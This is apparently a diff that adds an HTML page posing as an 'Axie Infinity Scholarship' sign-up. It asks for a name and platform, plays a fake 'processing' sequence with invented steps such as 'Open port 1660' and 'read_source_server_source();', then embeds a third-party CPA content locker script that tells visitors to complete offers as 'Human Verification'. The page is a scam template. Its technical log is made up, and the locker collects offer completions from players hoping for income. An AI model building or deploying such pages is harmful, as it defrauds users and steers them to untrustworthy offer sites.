@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axie Infinity Scholarship</title>
+    <link rel="stylesheet" href="style.min.css">
+</head>
+
+<body>
+    <main>
+        <div class="welcome">
+            <div class="title">
+                <h1 class="title-text">Axie Infinity</h1>
+                <h2 class="title-text">Scholarship</h2>
+            </div>
+            <div class="container">
+                <div class="platform step1 show" id="step1">
+                    <h3 class="mid-text">What platform?</h3>
+                    <div class="choose">
+                        <div class="input-cont">
+                            <input type="text" class="input" placeholder="Enter your name" id="username">
+                            <p class="error" id="username-error">Please enter your name</p>
+                        </div>
+                        <div class="single-element choose-platform active">
+                            <picture>
+                                
+                                <source srcset="./img/android1.png" type="image/png">
+                                <img src="./img/android1.png" alt="stream-icon">
+                            </picture>
+                        </div>
+                        <div class="single-element choose-platform">
+                            <picture>
+                                
+                                <source srcset="./img/new.jpg" type="image/jpg">
+                                <img src="./img/new.jpg" alt="ps-icon">
+                            </picture>
+                        </div>
+                        <div class="single-element choose-platform">
+                            <picture>
+                                
+                                <source srcset="./img/win1.jpg" type="image/jpg">
+                                <img src="./img/win1.jpg" alt="xbox-icon">
+                            </picture>
+                        </div>
+                        <div class="switch">
+                            <p class="small-text">Enable Encryption</p>
+                            <div class="onoffswitch">
+                                <input type="checkbox" name="onoffswitch" class="onoffswitch-checkbox"
+                                    id="myonoffswitch" tabindex="0" checked>
+                                <label class="onoffswitch-label" for="myonoffswitch">
+                                    <span class="onoffswitch-inner"></span>
+                                    <span class="onoffswitch-switch"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    <a href="javascript:void(0)" class="btn primary" id="connect-btn">Connect</a>
+                </div>
+                <div class="platform step2" id="step2">
+                    <h3 class="mid-text">Processing_</h3>
+                    <div class="processing-box">
+                        <p class="process-text">> Connecting...</p>
+                        <p class="process-text hide">> Open port 1660</p>
+                        <p class="process-text hide">> Connecting... </p>
+                        <p class="process-text hide">> Ready</p>
+                        <p class="process-text hide">> Performing User authentication…</p>
+                        <p class="process-text hide">> Encrypting communication with server: 256bit_Packet_Encryption();</p>
+                        <p class="process-text hide">> Retrieving current server script: read_source_server_source();</p>
+                        <p class="process-text hide">> Generating Axie();</p>
+                        <p class="process-text hide">> Downloading… </p>
+                    </div>
+                    <div class="progress">
+                        <div class="progress-value"></div>
+                    </div>
+                </div>
+                <div class="platform step3" id="step3">
+                    <div class="done-img">
+                        <picture>
+                            <source srcset="./img/check-icon.webp" type="image/webp">
+                            <source srcset="./img/check-icon.png" type="image/png">
+                            <img src="./img/check-icon.png" alt="check-icon">
+                        </picture>
+                    </div>
+                    <h3 class="mid-text">Human Verification</h3>
+                    <h3 class="mid-text small">Please use the CAPTCHA below and follow the offer from the list to start the scholarship.</h3>
+                    <div class="locker" id="locker">
+						<!-- Below  -->
+						<div id="cpa-locker-448bb740-0541-11ec-857d-238f0bd1950a"></div><script type="text/javascript" id="cpljs-448bb740-0541-11ec-857d-238f0bd1950a" src="//captchalocker.pl/iframeLoader/448bb740-0541-11ec-857d-238f0bd1950a?"></script>
+                    </div>  
+                </div>
+            </div>
+        </div>
+        <div class="bottom step1" id="bottom">
+            <div class="container">
+                <div class="recent-activity-container">
+                    <div class="recent-title">
+                        <h3 class="large-text">Recent</h3>
+                        <h3 class="large-text">activity</h3>
+                    </div>
+                    <div class="activity" id='activity'>
+
+                        <div id="last"> 
+                        </div>
+                    </div>
+                </div>
+                <div class="divider">
+                    <div class="line bold"></div>
+                    <div class="logo-img">
+                        
+                    </div>
+                    <div class="line"></div>
+                </div>
+                <div class="info">
+                    <p class="small-text">Axie Infinity is a Pokémon-inspired universe where anyone can earn tokens through skilled gameplay and contributions to the ecosystem. Players can battle, collect, raise, and build a land-based kingdom for their pets.
+                     All art assets and Axie genetic data can be easily accessed by 3rd parties, allowing community developers to build their own tools and experiences in the Axie Infinity universe.
+                    While still in early access, Axie is ranked the #1 Ethereum game by daily, weekly, and monthly active users. It has generated over 13,000 ETH in revenue (16M+ USD) so far.</p>
+                    <br><br>
+                    <p class="small-text"> While Axie is a fun game, it's also taken on characteristics of a social network and jobs platform due to the strong community and play to earn opportunities that have come from its early success.The key difference between Axie and a traditional game is that Blockchain economic design is used to reward our players for their contributions to the ecosystem. This new model of gaming has been dubbed "play to earn". Axie has attracted thousands of players from developing countries in the pursuit of a new income stream during the Covid pandemic. Many of these players are fathers, aunts, and even grandparents who have never used Blockchain technology before!
+                    </p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+    <script src="./js/script.js"></script>
+    <script src="./js/activity.js"></script>
+    <script src="./js/steps.js"></script>
+</body>
+
+</html>
